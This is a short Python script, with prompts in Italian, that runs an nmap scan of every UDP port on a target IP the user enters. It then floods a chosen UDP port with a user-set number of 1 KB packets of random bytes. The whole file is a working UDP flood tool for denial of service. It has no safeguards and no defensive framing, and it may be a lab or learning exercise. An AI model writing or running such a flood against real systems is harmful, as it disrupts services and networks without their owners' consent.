import subprocess
import re
import socket as so
import random

def scan_udp_ports(ip_target):
    try:
        print("esecuzione scansione nmap porte UDP...")
        nmap_command=["nmap","-sU","-p-",ip_target]
        result = subprocess.run(nmap_command, capture_output=True, text=True)
        open_ports=re.findall(r"(\d+)/udp\s+open", result.stdout)
        return [int(port) for port in open_ports]
    except Exception as e:
        print (f"errore durante la scansione: {e}")
        return []

ip_target=input("inserisci ip target: ")
open_ports=scan_udp_ports(ip_target)

if not open_ports:
    print("nessuna porta UDP aperta trovata")
else:
    print(f"porte UDP aperte trovate: {open_ports}")


port_target=int(input("inserisci la porta udp target: "))

num_pacchetti=int(input("inserisci numero di pacchetti da 1KB da inviare: "))

sock=so.socket(so.AF_INET, so.SOCK_DGRAM)
packet_size=1024
for i in range(num_pacchetti):
    packet=bytearray(random.getrandbits(8) for _ in range(packet_size))
    sock.sendto(packet, (ip_target,port_target))
    print(f"Pacchetto {i+1} inviato.")

print("invio dei pacchetti completato.")
sock.close()